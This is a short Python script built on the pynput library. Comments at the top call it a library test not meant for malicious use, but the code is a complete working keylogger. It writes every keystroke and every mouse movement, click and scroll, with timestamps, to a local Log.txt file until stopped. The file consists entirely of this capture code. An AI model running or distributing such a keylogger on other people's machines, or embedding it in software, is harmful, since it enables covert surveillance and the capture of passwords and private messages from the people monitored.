###Disclaimer, this was made to test the pynput library.
###This was not made to be used in any practical sense or for any malicious purpose
##Imports
from pynput.keyboard import Key, Listener as keyL
from pynput.mouse import Listener as mouL
import logging
##Log Info
log_dir = ""
logging.basicConfig(filename=(log_dir + "Log.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')
##Functions
def on_press(key):
    logging.info(key)
def on_move(x,y):
    logging.info("Mouse moved to ({0}x,{1}y).".format(x,y))
def on_click(x,y,button,pressed):
    if pressed:
        logging.info("Mouse {0} clicked at ({1}x ,{2}y).".format(button,x,y))
def on_scroll(x,y,dx,dy):
    logging.info("Mouse Scrolled at ({0}x, {1}y), ({2}, {3})".format(x,y,dx,dy))
#Primary Action
with keyL(on_press=on_press) as KeyL, mouL (on_move=on_move, on_click=on_click, on_scroll=on_scroll) as MouL:
    KeyL.join()
    MouL.join() 